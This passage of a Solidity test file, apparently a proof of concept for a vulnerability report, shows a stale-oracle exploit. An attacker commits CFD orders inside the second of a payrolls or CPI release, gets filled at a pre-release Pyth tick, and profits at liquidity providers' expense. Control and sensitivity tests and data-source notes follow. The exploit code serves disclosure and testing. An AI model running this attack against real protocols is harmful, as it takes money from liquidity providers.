            new ReleaseOracleForTest(address(engine), address(pool), address(baseMockPyth), ids, q, b, inv);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(o)}));
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeOracleConfig();
        assertEq(address(router.pletherOracle()), address(o), "release oracle installed");
    }

    // ------------------------------------------------------------------ data helpers

    function _oct() internal view returns (Series memory s) {
        s.T = OCT_T;
        s.eur = OCT_EUR;
        s.eurConf = OCT_EUR_CONF;
        s.jpy = OCT_JPY;
        s.jpyConf = OCT_JPY_CONF;
    }

    function _sep() internal view returns (Series memory s) {
        s.T = SEP_T;
        s.eur = SEP_EUR;
        s.eurConf = SEP_EUR_CONF;
        s.jpy = SEP_JPY;
        s.jpyConf = SEP_JPY_CONF;
    }

    function _cpi() internal view returns (Series memory s) {
        s.T = CPI_T;
        s.eur = CPI_EUR;
        s.eurConf = CPI_EUR_CONF;
        s.jpy = CPI_JPY;
        s.jpyConf = CPI_JPY_CONF;
    }

    function _tick(
        bytes32 id,
        int64 px,
        uint64 conf,
        int32 expo,
        uint256 publish
    ) internal pure returns (MockPyth.FeedUpdate memory u) {
        u = MockPyth.FeedUpdate(id, MockPyth.MockPrice(px, conf, expo, publish, publish - 1));
    }

    /// @dev Real per-second ticks for seconds idx [fromIdx, toIdx] (all six feeds per second, prev = publish - 1).
    function _payload(
        Series memory s,
        uint256 fromIdx,
        uint256 toIdx
    ) internal view returns (bytes[] memory data) {
        uint256 n = (toIdx - fromIdx + 1) * 6;
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](n);
        uint256 k;
        for (uint256 i = fromIdx; i <= toIdx; ++i) {
            uint256 pub = s.T + i - 2;
            u[k++] = _tick(ID_EUR, s.eur[i], s.eurConf[i], -5, pub);
            u[k++] = _tick(ID_JPY, s.jpy[i], s.jpyConf[i], -3, pub);
            int64 gbp = GBP_PX;
            int64 cad = CAD_PX;
            int64 sek = SEK_PX;
            int64 chf = CHF_PX;
            if (othersFollowEur) {
                // direct feed scales with EUR/USD; USD/xxx feeds scale inversely
                gbp = int64(int256(GBP_PX) * s.eur[i] / s.eur[3]);
                cad = int64(int256(CAD_PX) * s.eur[3] / s.eur[i]);
                sek = int64(int256(SEK_PX) * s.eur[3] / s.eur[i]);
                chf = int64(int256(CHF_PX) * s.eur[3] / s.eur[i]);
            }
            uint64 bps = (i == 3 && othersConfAtFillBps != 0) ? uint64(othersConfAtFillBps) : 0;
            u[k++] = _tick(ID_GBP, gbp, bps == 0 ? 13 : uint64(uint256(int256(gbp)) * bps / 10_000), -5, pub);
            u[k++] = _tick(ID_CAD, cad, bps == 0 ? 14 : uint64(uint256(int256(cad)) * bps / 10_000), -5, pub);
            u[k++] = _tick(ID_SEK, sek, bps == 0 ? 92 : uint64(uint256(int256(sek)) * bps / 10_000), -5, pub);
            u[k++] = _tick(ID_CHF, chf, bps == 0 ? 8 : uint64(uint256(int256(chf)) * bps / 10_000), -5, pub);
        }
        data = new bytes[](1);
        data[0] = abi.encode(u);
    }

    function _at(
        Series memory s,
        uint256 idx
    ) internal {
        uint256 t = s.T + idx - 2;
        if (vm.getBlockTimestamp() < t) {
            vm.warp(t);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _bounds(
        uint256 maxNotional,
        uint256 maxPostSize
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        uint256 window = router.maxExecutionWindowSeconds();
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1, // Live only
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: 1e6,
            maxExecutionNotionalAssets: maxNotional,
            maxGrossAccountDebitAssets: 200_000e6,
            maxActionChargeAssets: 50_000e6,
            maxExplicitFeesAssets: 10_000e6,
            maxPostPositionSize: maxPostSize,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: 2_000_000
        });
    }

    /// @dev LPs fund the day before (Junior first so the 80% Senior share holds), then the mark is refreshed with the
    ///      real tick of second T-2 through the public keeper route.
    function _prepare(
        Series memory s
    ) internal {
        vm.warp(s.T - 1 days);
        _fundJunior(JUNIOR_LP, 2_000_000e6);
        _fundSenior(SENIOR_LP, 6_000_000e6);
        _fundTrader(ATTACKER, 300_000e6);
        vm.deal(KEEPER, 1 ether);
        _at(s, 0);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: 0.01 ether}(_payload(s, 0, 0));
    }

    /// @dev Commit an open at second idx `commitIdx` (attacker), keeper executes it at T+5 with real ticks
    ///      [T-2 .. T+5] (the oracle discards ticks at or before the commit second); attacker commits the full close at
    ///      T+5, keeper executes at T+8 with ticks [T-2 .. T+8].
    function _run(
        Series memory s,
        CfdTypes.Side side,
        uint256 commitIdx
    ) internal returns (Outcome memory r) {
        _prepare(s);
        uint256 t0Bal = clearinghouse.balanceAssets(ATTACKER);
        uint256 pool0 = pool.accountedAssets();
        address treasury = engine.protocolTreasury();
        uint256 tr0 = clearinghouse.balanceAssets(treasury);

        _at(s, commitIdx);
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 mark = engine.lastMarkPrice();
        r.notional = (depth * 30) / 100; // 30% of depth, inside the 40% skew cap
        uint256 size = ((r.notional * 1e20 / mark) / 100e18) * 100e18;
        r.notional = size * mark / 1e20;
        OrderV3Types.OrderRequest memory open = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("nl-open", s.T, commitIdx)),
            side: side,
            sizeDelta: size,
            marginDelta: r.notional / 100, // 1% margin, 5x the 20 bps initial requirement
            targetPrice: side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            isClose: false,
            bounds: _bounds(r.notional * 103 / 100, size)
        });
        vm.prank(ATTACKER);
        uint64 openId = router.commitOrder(open);

        if (keeperRefreshAtT3) {
            _at(s, 5); // T+3: any keeper installs the post-release mark first
            vm.prank(KEEPER);
            router.updateMarkPrice{value: 0.01 ether}(_payload(s, 5, 5));
            assertEq(uint256(engine.lastMarkTime()), s.T + 3, "mark refreshed to T+3");
        }
        _at(s, 7); // T+5: the keeper has fresher ticks than the fill tick and includes them all
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory er = router.executeOrder{value: 0.01 ether}(openId, _payload(s, 0, 7));
        assertEq(uint8(er.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open must execute");
        (,, r.entryPrice,,,,) = engine.positions(ATTACKER);
        r.openFillPublishTime = engine.lastMarkTime();
        r.treasuryAfterOpen = clearinghouse.balanceAssets(treasury) - tr0;
        r.attackerAfterOpen = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(t0Bal);
        r.lpAfterOpen = int256(pool.accountedAssets()) - int256(pool0);

        OrderV3Types.OrderRequest memory close = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("nl-close", s.T, commitIdx)),
            side: side,
            sizeDelta: size,
            marginDelta: 0,
            targetPrice: side == CfdTypes.Side.LONG ? type(uint256).max : 1,
            isClose: true,
            bounds: _bounds(r.notional * 103 / 100, size)
        });
        vm.prank(ATTACKER);
        uint64 closeId = router.commitOrder(close);
        _at(s, 10); // T+8
        vm.prank(KEEPER);
        er = router.executeOrder{value: 0.01 ether}(closeId, _payload(s, 0, 10));
        assertEq(uint8(er.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close must execute");
        (uint256 left,,,,,,) = engine.positions(ATTACKER);
        assertEq(left, 0, "flat after close");

        r.attackerNet = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(t0Bal);
        r.lpDelta = int256(pool.accountedAssets()) - int256(pool0);
        r.treasuryFees = clearinghouse.balanceAssets(treasury) - tr0;
        r.exitMark = engine.lastMarkPrice();
    }

    function _log(
        string memory label,
        Outcome memory r
    ) internal pure {
        console2.log(label);
        console2.log("  notional (USDG atoms)", r.notional);
        console2.log("  entry price (8 dec)", r.entryPrice);
        console2.log("  engine mark publish time after open", uint256(r.openFillPublishTime));
        console2.log("  attacker net (USDG atoms)");
        console2.logInt(r.attackerNet);
        console2.log("  LP pool accounted delta (USDG atoms)");
        console2.logInt(r.lpDelta);
        console2.log("  treasury fees (USDG atoms)", r.treasuryFees);
        console2.log("  -- after open: treasury", r.treasuryAfterOpen);
        console2.log("     attacker clearinghouse delta / LP delta after open:");
        console2.logInt(r.attackerAfterOpen);
        console2.logInt(r.lpAfterOpen);
        console2.log("  exit mark (8 dec)", r.exitMark);
    }

    // ------------------------------------------------------------------ tests

    /// 2026-10-02 payrolls: USD weakened, basket ROSE; SHORT profits as the basket rises. Commit inside 12:30:00.
    function test_Attack_Oct02_CommitInReleaseSecond() public {
        Outcome memory r = _run(_oct(), CfdTypes.Side.SHORT, 2);
        _log("ATTACK 2026-10-02 SHORT committed at T (12:30:00)", r);
        assertEq(uint256(r.openFillPublishTime), OCT_T + 1, "oracle picked the stale T+1 tick");
        assertGt(r.attackerNet, 0, "net-profitable after fees, VPI and confidence shift");
        assertLt(r.lpDelta, 0, "LPs pay");
    }

    /// 2026-09-04 payrolls: USD strengthened, basket FELL; LONG profits as the basket falls.
    function test_Attack_Sep04_CommitInReleaseSecond() public {
        Outcome memory r = _run(_sep(), CfdTypes.Side.LONG, 2);
        _log("ATTACK 2026-09-04 LONG committed at T (12:30:00)", r);
        assertEq(uint256(r.openFillPublishTime), SEP_T + 1, "oracle picked the stale T+1 tick");
        assertGt(r.attackerNet, 0, "net-profitable after fees, VPI and confidence shift");
        assertLt(r.lpDelta, 0, "LPs pay");
    }

    /// Control: the same trade committed after Pyth already shows the move (T+2 -> fill at T+3) is not profitable.
    function test_Control_Oct02_CommitAfterPythShowsMove() public {
        Outcome memory r = _run(_oct(), CfdTypes.Side.SHORT, 4);
        _log("CONTROL 2026-10-02 SHORT committed at T+2", r);
        assertEq(uint256(r.openFillPublishTime), OCT_T + 3, "fill at T+3");
        assertLt(r.attackerNet, 0, "no edge once the oracle reflects the release");
    }

    /// 2026-09-11 CPI: USD strengthened, basket FELL; LONG. The T+2 tick already passes the gate here, so only a
    /// commit inside the release second (fill at T+1) captures the move.
    function test_Attack_Sep11CPI_CommitInReleaseSecond() public {
        Outcome memory r = _run(_cpi(), CfdTypes.Side.LONG, 2);
        _log("ATTACK 2026-09-11 CPI LONG committed at T (12:30:00)", r);
        assertEq(uint256(r.openFillPublishTime), CPI_T + 1, "oracle picked the stale T+1 tick");
        assertGt(r.attackerNet, 0, "net-profitable after fees, VPI and confidence shift");
        assertLt(r.lpDelta, 0, "LPs pay");
    }

    function test_Control_Sep11CPI_CommitAfterPythShowsMove() public {
        Outcome memory r = _run(_cpi(), CfdTypes.Side.LONG, 4);
        _log("CONTROL 2026-09-11 CPI LONG committed at T+2", r);
        assertEq(uint256(r.openFillPublishTime), CPI_T + 3, "fill at T+3");
        assertLt(r.attackerNet, 0, "no edge once the oracle reflects the release");
    }

    // ------------------------------------------------------------------ robustness and sensitivity

    /// A keeper refreshes the mark with the post-release T+3 tick BEFORE the open executes: the order still fills
    /// at the stale T+1 tick (an older historical fill is accepted; it only does not move the mark).
    function test_Robust_Oct02_KeeperRefreshAtT3First() public {
        keeperRefreshAtT3 = true;
        Outcome memory r = _run(_oct(), CfdTypes.Side.SHORT, 2);
        _log("ROBUST 2026-10-02 SHORT, keeper refreshed mark at T+3 before the open executed", r);
        assertEq(r.entryPrice, 97_398_257, "same stale T+1 fill as without the refresh");
        assertGt(r.attackerNet, 0, "still net-profitable");
    }

    function test_Robust_Sep04_KeeperRefreshAtT3First() public {
        keeperRefreshAtT3 = true;
        Outcome memory r = _run(_sep(), CfdTypes.Side.LONG, 2);
        _log("ROBUST 2026-09-04 LONG, keeper refreshed mark at T+3 before the open executed", r);
        assertEq(r.entryPrice, 99_452_880, "same stale T+1 fill as without the refresh");
        assertGt(r.attackerNet, 0, "still net-profitable");
    }

    /// USD-wide shock: the four constant feeds instead move vs USD like EUR/USD from T+1 (stale at T+1 like EUR).
    function test_Scenario_Oct02_OthersFollowEur() public {
        othersFollowEur = true;
        Outcome memory r = _run(_oct(), CfdTypes.Side.SHORT, 2);
        _log("SCENARIO 2026-10-02 SHORT, other four feeds follow EUR/USD", r);
        assertGt(r.attackerNet, 0, "net-profitable");
    }

    function test_Scenario_Sep04_OthersFollowEur() public {
        othersFollowEur = true;
        Outcome memory r = _run(_sep(), CfdTypes.Side.LONG, 2);
        _log("SCENARIO 2026-09-04 LONG, other four feeds follow EUR/USD", r);
        assertGt(r.attackerNet, 0, "net-profitable");
    }

    function test_Scenario_Sep11CPI_OthersFollowEur() public {
        othersFollowEur = true;
        Outcome memory r = _run(_cpi(), CfdTypes.Side.LONG, 2);
        _log("SCENARIO 2026-09-11 CPI LONG, other four feeds follow EUR/USD", r);
        assertGt(r.attackerNet, 0, "net-profitable");
    }

    /// Confidence sensitivity at the fill tick: the four unseen feeds at 25 bps each (vs ~1 bp normally) still pass
    /// the 10-bps basket gate, so the stale fill stands.
    function test_Sensitivity_Oct02_OthersConf25bpsAtFill() public {
        othersConfAtFillBps = 25;
        Outcome memory r = _run(_oct(), CfdTypes.Side.SHORT, 2);
        _log("SENSITIVITY 2026-10-02 SHORT, other four feeds at 25 bps confidence at T+1", r);
        assertGt(r.attackerNet, 0, "net-profitable");
    }

    /// If the unseen feeds were extremely wide at T+1 the gate rejects the fill tick: the open cannot execute and the
    /// attacker is simply not filled (fails safe for the attacker: no loss beyond gas).
    function test_Sensitivity_Oct02_OthersConf40bpsAtFill_NoFill() public {
        othersConfAtFillBps = 40;
        Series memory s = _oct();
        _prepare(s);
        _at(s, 2);
        uint256 mark = engine.lastMarkPrice();
        uint256 notional = 2_400_000e6;
        uint256 size = ((notional * 1e20 / mark) / 100e18) * 100e18;
        OrderV3Types.OrderRequest memory open = OrderV3Types.OrderRequest({
            clientOrderId: keccak256("nl-open-wide"),
            side: CfdTypes.Side.SHORT,
            sizeDelta: size,
            marginDelta: notional / 100,
            targetPrice: type(uint256).max,
            isClose: false,
            bounds: _bounds(notional * 103 / 100, size)
        });
        vm.prank(ATTACKER);
        uint64 openId = router.commitOrder(open);
        _at(s, 7);
        bytes[] memory data = _payload(s, 0, 7);
        vm.prank(KEEPER);
        try router.executeOrder{value: 0.01 ether}(openId, data) returns (OrderV3Types.ExecutionResult memory er) {
            assertTrue(er.status != OrderV3Types.LifecycleStatus.Executed, "must not fill at a gated tick");
        } catch {}
        (uint256 sz,,,,,,) = engine.positions(ATTACKER);
        assertEq(sz, 0, "no position");
    }

    function test_Control_Sep04_CommitAfterPythShowsMove() public {
        Outcome memory r = _run(_sep(), CfdTypes.Side.LONG, 4);
        _log("CONTROL 2026-09-04 LONG committed at T+2", r);
        assertEq(uint256(r.openFillPublishTime), SEP_T + 3, "fill at T+3");
        assertLt(r.attackerNet, 0, "no edge once the oracle reflects the release");
    }

}
```

**Data provenance.**
- Pyth Benchmarks: `GET https://benchmarks.pyth.network/v1/updates/price/{unix_second}?ids=<EUR/USD>&ids=<USD/JPY>&parsed=true`.
  It requires an API key. Ours is not entitled to GBP/USD, USD/CAD, USD/SEK or USD/CHF, which is why those four are held
  constant or modelled.
- Dukascopy: `http://datafeed.dukascopy.com/datafeed/{PAIR}/{yyyy}/{month-1}/{dd}/{hh}h_ticks.bi5`.
- The per-second rows, the census, the Pyth metadata, the millisecond rows and the decoders are available on request.

